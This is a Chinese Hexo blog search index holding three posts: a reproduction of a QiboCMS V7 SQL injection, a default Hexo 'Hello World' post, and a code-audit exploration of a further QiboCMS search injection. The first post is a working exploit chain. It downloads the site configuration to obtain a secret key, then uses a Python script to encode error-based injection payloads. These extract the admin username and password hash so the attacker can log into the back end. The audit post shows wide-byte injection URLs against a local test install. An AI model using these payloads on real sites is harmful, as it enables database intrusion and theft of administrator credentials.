<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>齐博CMS-SQL注入</title>
    <link href="/2022/07/12/qibocms-sql/"/>
    <url>/2022/07/12/qibocms-sql/</url>
    
    <content type="html"><![CDATA[<h2 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h2><h3 id="确认目标存在路径："><a href="#确认目标存在路径：" class="headerlink" title="确认目标存在路径："></a>确认目标存在路径：</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">/do/activate.php<br></code></pre></td></tr></table></figure><h3 id="配置文件下载"><a href="#配置文件下载" class="headerlink" title="配置文件下载:"></a>配置文件下载:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/do/job.php?job=download&amp;url=ZGF0YS9jb25maWcucGg8<br></code></pre></td></tr></table></figure><h3 id="查找配置文件中的相关内容"><a href="#查找配置文件中的相关内容" class="headerlink" title="查找配置文件中的相关内容:"></a>查找配置文件中的相关内容:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">webdb[<span class="hljs-string">&#x27;mymd5&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="如果配置文件无法下载"><a href="#如果配置文件无法下载" class="headerlink" title="如果配置文件无法下载"></a>如果配置文件无法下载</h3><p>mymd5值获取方法可以参考其他师傅的：<a href="https://xz.aliyun.com/t/2879">先知：QiboCMS从SQL注入到getshell</a></p><h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><h3 id="payload脚本："><a href="#payload脚本：" class="headerlink" title="payload脚本："></a>payload脚本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env python3</span><br><span class="hljs-comment"># _*_ coding:utf-8 _*_</span><br>import <span class="hljs-built_in">base64</span><br>import hashlib<br><br><br>def sec_md5(input):<br>    md5 = hashlib.md5(str.encode(input))<br>    md5res = md5.hexdigest()<br>    <span class="hljs-built_in">return</span> md5res<br><br><br>def check_mymd5(mymd5,string):<br>    secret_string = mymd5+<span class="hljs-string">&#x27;5*j,.^&amp;;?.%#@!&#x27;</span><br>    md5code = sec_md5(string)[8:18]<br>    md5str = md5code + secret_string<br>    key = sec_md5(md5str)<br>    keylen = len(key)<br>    strlen = len(string)<br><br>    code = <span class="hljs-string">&#x27;&#x27;</span><br>    i = 0<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(strlen):<br>        k = i % keylen<br>        ASCstr = ord(string[i])<br>        ASCkey = ord(key[k])<br>        code += chr(ASCstr ^ ASCkey)<br>        i+=1<br><br>    code = str(base64.b64encode(code.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)+md5code<br>    <span class="hljs-built_in">return</span> code<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment">#这里选择使用updateXML还是floor获取用户名</span><br>    <span class="hljs-comment">#updateXML</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (updatexml(1,concat(0x7e,(substring((select username from qb_memberdata where groupid=3),1,32))),1))#&quot;</span><br>    <span class="hljs-comment">#floor</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (select 1 from (select count(*),concat(0x7e,(select username from qb_memberdata where groupid=3),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)#&quot;</span><br><br>    <span class="hljs-comment">#这里选择使用updateXML还是floor获取密码，注意修改语句中的用户名</span><br>    <span class="hljs-comment">#updateXML</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (updatexml(1,concat(0x7e,(substring((select password from qb_members where username=&#x27;admin&#x27;),1,32)),0x7e),1))#&quot;</span><br>    <span class="hljs-comment">#floor</span><br>    <span class="hljs-comment">#string = &quot;&#x27; and (select 1 from (select count(*),concat((select password from qb_members where username=&#x27;admin&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a)#&quot;</span><br><br><br>    <span class="hljs-comment">#每个网站的mymd5都不一样，记得换</span><br>    mymd5 = <span class="hljs-string">&#x27;******&#x27;</span><br>    <span class="hljs-built_in">print</span>(check_mymd5(mymd5, string))<br></code></pre></td></tr></table></figure><h3 id="访问目标漏洞地址"><a href="#访问目标漏洞地址" class="headerlink" title="访问目标漏洞地址"></a>访问目标漏洞地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /do/activate.php?job=activate&amp;md5_id=[payload脚本]<br></code></pre></td></tr></table></figure><p>下图红框中的部分就是我们要找的明文username</p><p><img src="/img/qibocms-sql/qibocms-sql-01.png"></p><p>使用同样的方法获取password，然后md5解密，之后找到后台地址登陆就可以了，后台默认路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/admin/index.php<br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-sql/qibocms-sql-02.jpg"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="复现环境：qibocms-V7"><a href="#复现环境：qibocms-V7" class="headerlink" title="复现环境：qibocms-V7"></a>复现环境：qibocms-V7</h3><p>这里解释一下为什么payload中查找用户名会写：select username from qb_memberdata where groupid&#x3D;3<br>我们装好环境后可以看到：<br><img src="/img/qibocms-sql/qibocms-sql-05.jpg"></p><h3 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h3><p><img src="/img/qibocms-sql/qibocms-sql-03.jpg"><br>漏洞点在这里，我们可以根据这个路径 &#x2F;do&#x2F;activate.php?job&#x3D;activate&amp;md5_id&#x3D;$md5_id 看一下具体代码</p><p>大概梳理了一下，路径是这样的：</p><p>activate-&gt;mymd5-&gt;get_allInfo-&gt;get_passport-&gt;get_one-&gt;query-&gt;Err</p><div class="note note-success">            <p>activate</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-04.jpg"></p><p>当我们输入：&#x2F;do&#x2F;activate.php?job&#x3D;activate&amp;md5_id&#x3D;payload脚本，进入activate后首先调用了mymd5函数</p><div class="note note-success">            <p>mymd5</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-06.jpg"></p><p>这里需要注意蓝色的那一行，我们在脚本中是这样写的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aaa<span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(substring((select username from qb_memberdata where groupid=3),1,32)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><p>aaa并不重要，可以删掉，但是0x7e很重要，一个就够了。它生成的payload脚本是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FxNQDFIQHEZFVVZHUBwIWhtXHAcOAAAAU1VSgcBFE5DRlMRQkJdXVIZH0BQCABVR0ZFFwQQX1dYAEVUQgtVRkFRbg9TXVZWR1VWR1REEl5WFFVEBhBeQ0UMAQ8DTRRXHAADSx8ZGAIcGBQ=10342945bb<br></code></pre></td></tr></table></figure><p>裁剪过后可以保障我们payload的完整性。</p><p><img src="/img/qibocms-sql/qibocms-sql-07.jpg"></p><p>经过mymd5函数的处理，可以看到脚本内容被还原了</p><div class="note note-success">            <p>get_allInfo</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-08.jpg"></p><p>这里把还原的脚本赋值给username，然后开始运行函数get_allInfo</p><div class="note note-success">            <p>get_passport</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-09.jpg"></p><p>可以看到get_allInfo调用了函数get_passport，跟进看一下</p><div class="note note-success">            <p>get_one</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-10.jpg"></p><p>发现简单赋值和拼接后，调用了函数get_one</p><p><img src="/img/qibocms-sql/qibocms-sql-11.jpg"></p><div class="note note-success">            <p>query</p>          </div><p>这里就是准备执行我们sql语句的地方了，我们跟进query函数</p><p><img src="/img/qibocms-sql/qibocms-sql-12.jpg"><br><img src="/img/qibocms-sql/qibocms-sql-13.jpg"></p><p>query函数连接了数据库，updateXML开始发挥作用（当Xpath路径语法错误时，就会报错，错误路径内容中的sql语句会被执行），报错的信息会通过SQLlink进行传输（目前是这么理解的）</p><p>UpdateXML语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">UpdateXML(xml_target, xpath_expr, new_xml)<br>xml_target:： 需要操作的xml<br>xpath_expr： 需要更新的xml路径(Xpath格式)<br>new_xml： 新的xml<br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-sql/qibocms-sql-14.jpg"><br><img src="/img/qibocms-sql/qibocms-sql-16.jpg"></p><p>这里get_one接收了返回值，并把返回的结果null一路返回到了active，接下来就是用Err函数报错，跟进看一下</p><div class="note note-success">            <p>Err</p>          </div><p><img src="/img/qibocms-sql/qibocms-sql-17.jpg"></p><p>通过SQLlink把报错的内容传输出来，可以看到直接将报错结果输出了</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
      <category>qibocms</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/12/hello-world/"/>
    <url>/2022/04/12/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于齐博cms代码审计的思考</title>
    <link href="/2022/04/12/qibocms-thinking/"/>
    <url>/2022/04/12/qibocms-thinking/</url>
    
    <content type="html"><![CDATA[<blockquote><p>之前看到了齐博cms报错注入漏洞，就想是否可以使用同样的路径发现sql注入，在思考尝试中有了这篇文章，最终发现了sql注入，但版本仅限于4.1&lt;mysql≤5，也就是说2008年mysql出现5.1后，这个洞就用不了了，比较鸡肋，但思考的过程值得记一下。</p></blockquote><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><p>之前的齐博cms报错注入使用了以下两个函数：</p><p><img src="/img/qibocms-thinking/Untitled.png"><br><img src="/img/qibocms-thinking/Untitled%202.png"></p><p>query函数中有这么一行：<br><img src="/img/qibocms-thinking/Untitled%201.png"></p><p>可以让$query&#x3D;False，然后执行报错语句，$showerr代码自己定义&#x3D;1，那就不需要我们管了。</p><p>我首先查看了还有文件的调用路径包含这两个函数，结果在：&#x2F;do&#x2F;search.php 这里找到，为了调用其中的内容，我们可以写为：<code>type=keyword&amp;keyword=sql语句</code></p><p><img src="/img/qibocms-thinking/Untitled%203.png"></p><h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><p>这是一个搜索页面，之前学习PHP代码审计的时候，师傅给的例子就是ESPCMS的搜索框sql注入，所以觉得存在sql注入的可能性挺大的。</p><p>现在开始构造注入语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/qibocms-v7/do/search.php?<span class="hljs-built_in">type</span>=keyword&amp;keyword=%27%20and%20(updatexml(1,concat(0x7e,(substring((select%20username%20from%20qb_memberdata%20where%20groupid=3),1,32))),1))%20--%20<br></code></pre></td></tr></table></figure><p>发现我们传入的闭合<code>’</code>单引号被注释了，发现是针对符号%的过滤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$keyword</span>=str_replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;\%&quot;</span>,<span class="hljs-variable">$keyword</span>);<br></code></pre></td></tr></table></figure><p>发现我们注释符号<code>--</code> 后面的空格被吞掉了，那就在%20后面随意加个，改成：<code>--%20p</code></p><p>上面调试过程中发现有这么一行：</p><p><img src="/img/qibocms-thinking/Untitled%204.png"></p><p>那么我们就可以使用宽字节%df进行绕过（这里是个大坑，但此时还没意识到），进入到query函数发现我们成功让sql语句闭合：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.<span class="hljs-built_in">id</span>=B.<span class="hljs-built_in">id</span> WHERE A.keywords=<span class="hljs-string">&#x27;運&#x27;</span> and (updatexml(1,concat(0x7e,(substring((select username from qb_memberdata <span class="hljs-built_in">where</span> groupid=3),1,32))),1)) -- p<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-thinking/Untitled%205.png"></p><p>把语句放到phpmyadmin中看看是否能返回我们想要的结果，这里构造的sql语句是使用updatexml报出后台管理员用户名，发现我们的sql语句是没有问题的。</p><p><img src="/img/qibocms-thinking/Untitled%206.png"></p><p>那我们不是离胜利非常接近了？（并不，接着往下看）</p><h3 id="定位："><a href="#定位：" class="headerlink" title="定位："></a>定位：</h3><p>奇怪的地方来了，这个resource id是什么？$query不应该返回False才对嘛？</p><p><img src="/img/qibocms-thinking/Untitled%207.png"></p><p>查了一下mysql_query()得到以下两个结果：看来我们的情况是有红线的这边。</p><p><img src="/img/qibocms-thinking/Untitled%208.png"></p><p>来源：<a href="https://www.php.net/manual/en/function.mysql-query.php">https://www.php.net/manual/en/function.mysql-query.php</a></p><p><img src="/img/qibocms-thinking/Untitled%209.png"></p><p>来源：<a href="https://blog.csdn.net/weixin_30896511/article/details/95709013">https://blog.csdn.net/weixin_30896511&#x2F;article&#x2F;details&#x2F;95709013</a></p><p>因为我们的$method是空，所以只能运行mysql_query()，看来报错注入的方法行不通了，接着往下看看：</p><p><img src="/img/qibocms-thinking/Untitled%2010.png"></p><p><img src="/img/qibocms-thinking/Untitled%2011.png"></p><p>发现有mysql_fetch_array()那我们正常注入是不是可以呢？立马试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/qibocms-v7/do/search.php?<span class="hljs-built_in">type</span>=keyword&amp;keyword=%<span class="hljs-built_in">df</span>%27%20union%20select%20username%20from%20qb_memberdata%20where%20groupid=3%20--%20p<br></code></pre></td></tr></table></figure><p><img src="/img/qibocms-thinking/Untitled%2012.png"></p><p>这是怎么回事，怎么$array是空呢？</p><p>检查发现我们构造的sql语句没问题</p><p><img src="/img/qibocms-thinking/Untitled%2013.png"></p><p>然后自己用<code>mysql_connect() mysql_select_db() mysql_query() mysql_fetch_array()</code>这些函数，尽量贴近齐博cms的原本代码，连一下齐博cms的数据库，看看是否可以正常返回：</p><p><img src="/img/qibocms-thinking/Untitled%2014.png"></p><p>发现没有问题。那么就排除了<code>mysql_fetch_array()</code>的问题，只把产生问题的地方定位在query()函数这里：</p><p><img src="/img/qibocms-thinking/Untitled%2015.png"></p><h3 id="排查："><a href="#排查：" class="headerlink" title="排查："></a>排查：</h3><p>接下来我们把自己写的，没有问题的那些代码放到query()里面执行，结果发现居然也没有Array，然后我们开始改造sql语句，看看正常sql语句能否执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">原本的：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;運&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span>;<br>改造一：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;select username from qb_memberdata where groupid=3&quot;</span>;<br>改造二：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;select 1 and 1=2 union select username from qb_memberdata where groupid=3&quot;</span>;<br>改造三：<span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>结果出来了，除了原本的其他改造sql语句全部能执行，这就说明是我们的宽字节闭合出问题了，再确认一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sqll</span> = <span class="hljs-string">&quot;SELECT B.aid FROM qb_keywordid B LEFT JOIN qb_keyword A ON A.id=B.id WHERE A.keywords=&#x27;好&#x27; union select username from qb_memberdata where groupid=3 -- p&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>发现执行正常，为什么我们看到dbcharset&#x3D;gbk，使用宽字节闭合时会出错呢？在query()中有连接数据库的函数connect()，跟进看一下发生了什么（之前调试都会跳过它，以为只是进行数据库连接，并没有其他用处），结果发现了下面的代码。</p><p><img src="/img/qibocms-thinking/Untitled%2016.png"></p><p>赶紧看一下我们的数据库版本，发现是5.5，所以说，宽字节闭合sql语句发生了错误，再看看mysql5.1版本是什么时候发行的，发现是2008年，哎。</p><h2 id="大疑问"><a href="#大疑问" class="headerlink" title="大疑问"></a>大疑问</h2><p>那为什么我们模拟齐博cms源代码，也没有设定连接时必须是gbk，为什么执行时没有出错呢？</p><p>现在把重点放到这个代码上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里是空的，也就是并没有定义MySQL应该支持的sql语法，对数据的校验等等，具体什么设置，可以参考；<a href="https://segmentfault.com/a/1190000005936172">https://segmentfault.com/a/1190000005936172</a></p><h3 id="小解答："><a href="#小解答：" class="headerlink" title="小解答："></a>小解答：</h3><p>那么这是怎么回事呢？有一种可能就是我们模拟时默认编码是utf8，mysql字符集也是utf8，所以没有问题，如果不设置mysql接收gbk，那么连接时齐博cms发送的是gbk，但是mysql只接收utf8，所以出错了。</p><p>通过这句话，我们就可以设置mysql接收gbk了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql_query(<span class="hljs-string">&quot;SET NAMES &#x27;<span class="hljs-variable">$dbcharset</span>&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>怎么把这句话放到我们的sql语句中呢？如果可以执行多行sql语句，那不就是堆叠注入了嘛？但是没有mysqli_multi_query()，所以无法实现。</p><div class="note note-success">            <p>最后</p>          </div><p>这些是目前的一些想法，还有很多的不足，师傅们请多指教。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计思考</category>
      
      <category>qibocms</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
